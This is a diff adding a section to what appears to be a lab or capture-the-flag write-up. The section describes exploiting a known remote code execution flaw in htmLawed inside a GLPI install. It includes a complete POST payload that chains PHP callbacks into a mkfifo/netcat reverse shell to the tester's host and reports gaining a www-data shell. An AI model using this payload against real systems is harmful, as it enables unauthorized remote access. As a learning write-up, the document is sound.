@@ -90,5 +90,19 @@ Using the gobuster results, we can begin to search through the used website inde
 
 # Service Enumeration 
 
+After some research into GLPI on exploitDB, we run into numerous scripts for a library expliot for htmlawed  > v1.9. While searching through the various libraries of files in the target ip subdomains, we find a the exploitable library under the "vendor" subdomain. 
+
+In this subdomain, we find a test version of htmLawed v1.2.6 that has a known remote code execution vulnerability. Using Burpsuite, we are able to capture the outogin Post requests and manipulate them into creating a reverse shell to our local host. 
+
+For example, in the POST request, we can add the below line of code and remove the exisiting lines:
+
+	sid=sle0r2ddd88mpg521su3ontl2d&text=call_user_func&hhook=array_map&hexec=passthru&spec[0]=&spec[1]=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+192.168.XXX.XXX+80+>/tmp/f
+
+Specfically, we are using the "netcat udp" format from revshells.com to perform this reverse exploit. Additionally, we are pointing the reverse shell to port 80 after multiple attempts on other ports such as 443, 9001... did not work.
+
+With success, we are able to achieve a reverse shell and are now logged in as a user, "www-data."
+
+
+We need to extract this end 
 
 # Privilege Escalation
